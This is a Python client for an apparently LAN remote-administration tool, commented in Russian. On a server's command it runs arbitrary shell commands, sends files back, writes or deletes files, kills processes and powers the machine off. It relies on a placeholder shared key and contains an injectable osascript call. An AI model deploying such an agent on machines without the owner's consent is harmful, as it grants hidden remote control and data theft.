import socket
import threading
import time
import json
import logging
import uuid
import os
import subprocess
import platform
import psutil
import base64
import sys

import cryptocode as cc

BROADCAST_IP = '255.255.255.255'
BROADCAST_PORT = 12345
ENCRYPTION_KEY = "YourSuperSecretKey123" # !!! ОБЯЗАТЕЛЬНО ИЗМЕНИТЕ ЭТОТ КЛЮЧ - ОН ДОЛЖЕН СОВПАДАТЬ С КЛЮЧОМ СЕРВЕРА !!!
FILE_CHUNK_SIZE = 4096 # Размер чанка для передачи файлов
KEEP_ALIVE_INTERVAL = 10 # Отправлять keep-alive сообщение каждые 10 секунд

LOG_FILE = "client.log"

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler(LOG_FILE, encoding='utf-8'),
                        logging.StreamHandler()
                    ])
logger = logging.getLogger('Client')

server_address = None
tcp_socket = None
client_id = str(uuid.uuid4()) # Уникальный ID для этого клиента
is_connecting = False # Флаг для предотвращения множественных попыток подключения
connection_active = False # Флаг, показывающий, что TCP-соединение установлено и активно
connection_lock = threading.Lock() # Лок для синхронизации доступа к tcp_socket и is_connecting

def restart_program():
    """
    Перезапускает текущую программу Python.
    """
    python = sys.executable
    os.execv(python, [python] + sys.argv)

def send_encrypted_message(sock, message_dict):
    """Отправляет зашифрованное JSON-сообщение на сервер."""
    try:
        encrypted_message = cc.encrypt(json.dumps(message_dict), ENCRYPTION_KEY)
        if encrypted_message:
            sock.sendall((encrypted_message + "\n").encode('utf-8'))
        else:
            logger.error("Не удалось зашифровать сообщение.")
            return False
    except (BrokenPipeError, ConnectionResetError, OSError) as e:
        logger.error(f"Ошибка сокета при отправке зашифрованного сообщения (соединение разорвано?): {e}")
        # Если при отправке произошла ошибка сокета, то соединение неактивно
        with connection_lock:
            global connection_active, tcp_socket
            if connection_active: # Только если оно было активно
                connection_active = False
                if tcp_socket:
                    try:
                        tcp_socket.shutdown(socket.SHUT_RDWR)
                        tcp_socket.close()
                    except Exception as close_e:
                        logger.error(f"Ошибка при закрытии сокета после ошибки отправки: {close_e}")
                tcp_socket = None
        return False
    except Exception as e:
        logger.error(f"Ошибка при отправке зашифрованного сообщения: {e}")
        return False
    return True

def receive_commands(sock):
    """Получает и обрабатывает команды от сервера."""
    global tcp_socket, connection_active

    buffer = ""
    #sock.settimeout(KEEP_ALIVE_INTERVAL * 2) # Установим таймаут на recv, чтобы обнаружить "мертвый" сервер

    try:
        while connection_active:
            try:
                data = sock.recv(4096 * 4)
                if not data:
                    logger.warning("Сервер отключился (получены пустые данные).")
                    break
            except socket.timeout:
                # Если таймаут, это не обязательно означает, что сервер отключился.
                # Просто не было данных. Продолжаем ожидать.
                continue
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.warning(f"Ошибка сокета в receive_commands: {e}. Соединение, вероятно, потеряно.")
                break # Выход из цикла при ошибке сокета
            except Exception as e:
                logger.error(f"Непредвиденная ошибка в receive_commands: {e}")
                break # Выход из цикла при других ошибках

            buffer += data.decode('utf-8')

            while "\n" in buffer:
                message, buffer = buffer.split("\n", 1)
                if not message.strip():
                    continue

                try:
                    decrypted_message = cc.decrypt(message.strip(), ENCRYPTION_KEY)
                    if decrypted_message is None:
                        logger.warning(f"Не удалось расшифровать сообщение от сервера. Возможно, неверный ключ или поврежденные данные. Сообщение (часть): {message.strip()[:100]}...")
                        continue

                    command = json.loads(decrypted_message)
                    handle_command(sock, command)

                except json.JSONDecodeError:
                    logger.warning(f"Некорректный JSON от сервера: {decrypted_message}")
                except Exception as e:
                    logger.error(f"Ошибка при обработке команды: {e} (Сообщение: {message})")

    finally:
        logger.info("Поток получения команд завершен.")
        with connection_lock:
            if connection_active:
                logger.info("Устанавливаем connection_active = False и закрываем сокет.")
                connection_active = False
                if tcp_socket:
                    try:
                        tcp_socket.shutdown(socket.SHUT_RDWR)
                        tcp_socket.close()
                    except Exception as e:
                        logger.error(f"Ошибка при закрытии сокета в receive_commands finally: {e}")
                tcp_socket = None
                restart_program()

def send_keep_alive():
    """Периодически отправляет keep-alive сообщение серверу."""
    global tcp_socket, connection_active
    while True:
        with connection_lock:
            if connection_active and tcp_socket:
                if not send_encrypted_message(tcp_socket, {"type": "keep_alive", "payload": "ping"}):
                    logger.warning("Не удалось отправить keep-alive сообщение. Соединение, возможно, разорвано.")
                    # send_encrypted_message уже обрабатывает обновление connection_active и tcp_socket
            else:
                # Если соединение неактивно, можно выйти из этого потока или просто подождать
                pass
        time.sleep(KEEP_ALIVE_INTERVAL)

def handle_command(sock, command):
    """Обрабатывает полученную команду и отправляет ответ."""
    command_type = command.get("type")
    payload = command.get("payload", {})
    command_text = payload.get("text", "")
    new_name = payload.get("new_name", "")

    response_payload = "Неизвестная команда или ошибка выполнения."
    response_type = "response"

    try:
        if command_type == "get_sysinfo":
            system_info = {
                "system": platform.system(),
                "node_name": platform.node(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "user": os.getlogin() if hasattr(os, 'getlogin') else 'N/A',
                "cwd": os.getcwd()
            }
            response_payload = system_info
            response_type = "sysinfo"
        elif command_type == "ping":
            response_payload = "pong"
            response_type = "ping_response"
        elif command_type == "shutdown":
            response_payload = "Команда выключения получена."
            if platform.system() == "Windows":
                subprocess.run(["shutdown", "/s", "/t", "1"], check=True)
            elif platform.system() == "Linux" or platform.system() == "Darwin":
                subprocess.run(["sudo", "shutdown", "-h", "now"], check=True)
            else:
                response_payload += " (Платформа не поддерживается для выключения)."
            response_type = "shutdown_ack"
        elif command_type == "restart":
            response_payload = "Команда перезагрузки получена."
            if platform.system() == "Windows":
                subprocess.run(["shutdown", "/r", "/t", "1"], check=True)
            elif platform.system() == "Linux" or platform.system() == "Darwin":
                subprocess.run(["sudo", "reboot"], check=True)
            else:
                response_payload += " (Платформа не поддерживается для перезагрузки)."
            response_type = "restart_ack"
        elif command_type == "exec_cmd":
            try:
                result = subprocess.run(command_text, shell=True, capture_output=True, text=True, check=False)
                response_payload = {
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                    "returncode": result.returncode
                }
            except Exception as e:
                response_payload = f"Ошибка выполнения команды: {e}"
            response_type = "cmd_output"
        elif command_type == "show_message":
            if platform.system() == "Windows":
                script = f"""
                Add-Type -AssemblyName PresentationCore,PresentationFramework;
                [System.Windows.MessageBox]::Show('{command_text.replace("'", "''")}', 'Сообщение от админа', 'OK', 'Information');
                """
                subprocess.Popen(["powershell.exe", "-Command", script], creationflags=subprocess.DETACHED_PROCESS, close_fds=True)
                response_payload = f"Сообщение '{command_text}' показано."
            elif platform.system() == "Linux":
                try:
                    subprocess.run(["zenity", "--info", "--text", command_text, "--title", "Сообщение от админа"], check=True)
                    response_payload = f"Сообщение '{command_text}' показано (Zenity)."
                except FileNotFoundError:
                    subprocess.run(["echo", f"Сообщение от админа: {command_text}"], check=True)
                    response_payload = f"Сообщение '{command_text}' показано (консоль)."
            elif platform.system() == "Darwin":
                subprocess.run(["osascript", "-e", f'display dialog "{command_text}" with title "Сообщение от админа" buttons {{"OK"}} default button "OK"'], check=True)
                response_payload = f"Сообщение '{command_text}' показано."
            else:
                response_payload = f"Отображение сообщения не поддерживается на {platform.system()}."
            response_type = "message_ack"
        elif command_type == "get_processes":
            processes_list = []
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'status', 'cpu_percent', 'memory_percent']):
                try:
                    processes_list.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            response_payload = processes_list
            response_type = "processes_list"
        elif command_type == "kill_process":
            try:
                found = False
                for proc in psutil.process_iter(['pid', 'name']):
                    if str(proc.info['pid']) == command_text or proc.info['name'].lower() == command_text.lower():
                        proc.terminate()
                        proc.wait(timeout=3)
                        found = True
                        response_payload = f"Процесс {command_text} успешно завершен."
                        break
                if not found:
                    response_payload = f"Процесс {command_text} не найден."
            except Exception as e:
                response_payload = f"Ошибка при завершении процесса {command_text}: {e}"
            response_type = "kill_process_ack"
        elif command_type == "list_dir":
            target_path = command_text if command_text else os.getcwd()
            
            if platform.system() == "Windows":
                target_path = os.path.normpath(target_path)
            
            dir_items = []
            current_path = target_path

            if os.path.exists(target_path) and os.path.isdir(target_path):
                try:
                    with os.scandir(target_path) as entries:
                        for entry in entries:
                            item_info = {
                                "name": entry.name,
                                "full_path": entry.path,
                                "type": "directory" if entry.is_dir() else "file",
                                "size": entry.stat().st_size if entry.is_file() else None
                            }
                            dir_items.append(item_info)
                    response_payload = {"items": dir_items, "current_path": current_path}
                    response_type = "dir_list"
                except PermissionError:
                    response_payload = f"Отказано в доступе к папке: {target_path}"
                    response_type = "error"
                except Exception as e:
                    response_payload = f"Ошибка при просмотре папки {target_path}: {e}"
                    response_type = "error"
            else:
                response_payload = f"Путь не существует или не является папкой: {target_path}"
                response_type = "error"
        elif command_type == "get_drives_list":
            drives = []
            if platform.system() == "Windows":
                for part in psutil.disk_partitions(all=False):
                    if 'cdrom' not in part.opts and 'removable' not in part.opts:
                        if os.path.exists(part.mountpoint):
                             drives.append(part.mountpoint)
            elif platform.system() == "Linux" or platform.system() == "Darwin":
                drives.append("/")
                for part in psutil.disk_partitions(all=False):
                    if part.mountpoint != '/' and os.path.exists(part.mountpoint):
                        drives.append(part.mountpoint)

            response_payload = drives
            response_type = "drives_list"
        elif command_type == "download_file_client":
            file_path = command_text
            if os.path.exists(file_path) and os.path.isfile(file_path):
                try:
                    file_size = os.path.getsize(file_path)
                    file_name = os.path.basename(file_path)
                    file_id = str(uuid.uuid4())

                    if not send_encrypted_message(sock, {
                        "type": "file_transfer_start",
                        "payload": {
                            "file_id": file_id,
                            "file_name": file_name,
                            "total_size": file_size
                        }
                    }):
                        raise Exception("Не удалось отправить сообщение о начале передачи файла.")
                    logger.info(f"Отправлено начало передачи файла '{file_name}' на сервер.")

                    with open(file_path, "rb") as f:
                        while True:
                            chunk = f.read(FILE_CHUNK_SIZE)
                            if not chunk:
                                break
                            chunk_base64 = base64.b64encode(chunk).decode('utf-8')
                            if not send_encrypted_message(sock, {
                                "type": "file_chunk",
                                "payload": {
                                    "file_id": file_id,
                                    "chunk": chunk_base64
                                }
                            }):
                                raise Exception("Не удалось отправить чанк файла.")

                    response_payload = f"Файл '{file_name}' успешно отправлен на сервер."
                    response_type = "file_download_ack"

                except Exception as e:
                    response_payload = f"Ошибка при отправке файла '{file_path}': {e}"
                    response_type = "error"
            else:
                response_payload = f"Файл не найден или не является файлом: {file_path}"
                response_type = "error"
        elif command_type == "upload_file_client":
            target_path = command_text
            file_content_base64 = payload.get("file_content")

            if not file_content_base64:
                response_payload = "Нет содержимого файла для загрузки."
                response_type = "error"
            else:
                try:
                    file_content_bytes = base64.b64decode(file_content_base64)
                    
                    dir_name = os.path.dirname(target_path)
                    if dir_name and not os.path.exists(dir_name):
                        os.makedirs(dir_name, exist_ok=True)

                    with open(target_path, "wb") as f:
                        f.write(file_content_bytes)
                    response_payload = f"Файл успешно загружен по пути: {target_path}"
                    response_type = "file_upload_ack"
                except Exception as e:
                    response_payload = f"Ошибка при загрузке файла: {e}"
                    response_type = "error"
        elif command_type == "delete_path":
            target_path = command_text
            if os.path.exists(target_path):
                try:
                    if os.path.isfile(target_path):
                        os.remove(target_path)
                        response_payload = f"Файл '{target_path}' успешно удален."
                    elif os.path.isdir(target_path):
                        import shutil
                        shutil.rmtree(target_path)
                        response_payload = f"Папка '{target_path}' и её содержимое успешно удалены."
                    response_type = "delete_ack"
                except Exception as e:
                    response_payload = f"Ошибка при удалении '{target_path}': {e}"
                    response_type = "error"
            else:
                response_payload = f"Путь не существует: {target_path}"
                response_type = "error"
        elif command_type == "create_folder":
            folder_path = command_text
            try:
                os.makedirs(folder_path, exist_ok=True)
                response_payload = f"Папка '{folder_path}' успешно создана."
                response_type = "create_folder_ack"
            except Exception as e:
                response_payload = f"Ошибка при создании папки '{folder_path}': {e}"
                response_type = "error"
        elif command_type == "rename_path":
            old_path = command_text
            new_name_val = new_name
            if os.path.exists(old_path):
                try:
                    if os.path.dirname(new_name_val) == '':
                        parent_dir = os.path.dirname(old_path)
                        new_path = os.path.join(parent_dir, new_name_val)
                    else:
                        new_path = new_name_val
                    
                    os.rename(old_path, new_path)
                    response_payload = f"'{old_path}' успешно переименован в '{new_path}'."
                    response_type = "rename_ack"
                except Exception as e:
                    response_payload = f"Ошибка при переименовании '{old_path}' в '{new_path}': {e}"
                    response_type = "error"
            else:
                response_payload = f"Исходный путь не существует: {old_path}"
                response_type = "error"
        else:
            response_payload = f"Неизвестная команда: {command_type}"
            response_type = "error"

    except Exception as e:
        logger.error(f"Непредвиденная ошибка при выполнении команды {command_type}: {e}")
        response_payload = f"Непредвиденная ошибка: {e}"
        response_type = "error"

    finally:
        if response_type not in ["file_chunk", "file_transfer_start"]:
            send_encrypted_message(sock, {
                "type": response_type,
                "payload": response_payload,
                "client_id": client_id
            })

def broadcast_listener():
    """Слушает широковещательные объявления от сервера."""
    global server_address
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', BROADCAST_PORT))
    except OSError as e:
        logger.error(f"Не удалось привязать широковещательный сокет к порту {BROADCAST_PORT}: {e}. Убедитесь, что порт не занят.")
        sys.exit(1)
        
    logger.info(f"Слушатель широковещательных объявлений запущен на порту {BROADCAST_PORT}")

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            decrypted_info = cc.decrypt(data.decode('utf-8'), ENCRYPTION_KEY)
            if decrypted_info:
                info = json.loads(decrypted_info)
                new_server_address = (info["ip"], info["port"])
                if new_server_address != server_address:
                    server_address = new_server_address
                    logger.info(f"Обнаружен новый сервер: {server_address}. Попытка подключения...")
                    with connection_lock:
                        if not is_connecting and not connection_active:
                            threading.Thread(target=connect_to_server, daemon=True).start()
            else:
                logger.warning(f"Получено нерасшифрованное широковещательное сообщение от {addr}: {data.decode('utf-8')[:100]}...")
        except json.JSONDecodeError:
            logger.warning(f"Получено некорректное широковещательное объявление от {addr}: {data.decode('utf-8')[:100]}...")
        except Exception as e:
            logger.error(f"Ошибка в широковещательном слушателе: {e}")
        time.sleep(1)

def connect_to_server():
    """Устанавливает TCP-соединение с сервером."""
    global tcp_socket, server_address, is_connecting, connection_active
    
    with connection_lock:
        if is_connecting or connection_active:
            logger.info("Уже идет подключение или соединение активно. Отмена новой попытки.")
            return False
        is_connecting = True

    if server_address is None:
        logger.info("Адрес сервера не известен. Ожидание широковещательного объявления...")
        with connection_lock:
            is_connecting = False
        return False

    for attempt in range(5):
        try:
            logger.info(f"Попытка подключения к серверу: {server_address} (Попытка {attempt + 1}/5)")
            new_tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new_tcp_socket.connect(server_address)
            # new_tcp_socket.settimeout(None) # Таймаут будет установлен в receive_commands
            
            if not send_encrypted_message(new_tcp_socket, {"type": "client_connect", "payload": {"client_id": client_id, "name": platform.node()}}):
                logger.error("Не удалось отправить первое сообщение 'client_connect'. Закрываю сокет и повторяю.")
                new_tcp_socket.close()
                time.sleep(2)
                continue

            with connection_lock:
                if not connection_active:
                    tcp_socket = new_tcp_socket
                    connection_active = True
                    logger.info(f"Успешно подключен к серверу: {server_address}")
                    # Запускаем поток для получения команд
                    threading.Thread(target=receive_commands, args=(tcp_socket,), daemon=True).start()
                    return True
                else:
                    logger.warning("Соединение уже активно, закрываю дублирующее подключение.")
                    new_tcp_socket.close()
                    return True
        except ConnectionRefusedError:
            logger.warning(f"Сервер {server_address} отказал в подключении. Повторная попытка через 5 секунд...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"Ошибка при подключении к серверу {server_address}: {e}. Повторная попытка через 5 секунд...")
            time.sleep(5)
    
    logger.error(f"Не удалось подключиться к серверу {server_address} после {5} попыток.")
    with connection_lock:
        is_connecting = False
    return False

if __name__ == "__main__":
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("Начало лога клиента...\n")

    broadcast_thread = threading.Thread(target=broadcast_listener, daemon=True)
    broadcast_thread.start()
    logger.info("Поток слушателя широковещательных объявлений запущен.")

    # Запускаем поток для отправки keep-alive сообщений
    keep_alive_thread = threading.Thread(target=send_keep_alive, daemon=True)
    keep_alive_thread.start()
    logger.info("Поток отправки keep-alive сообщений запущен.")

    while True:
        with connection_lock:
            if not connection_active and not is_connecting:
                threading.Thread(target=connect_to_server, daemon=True).start()
        
        time.sleep(1)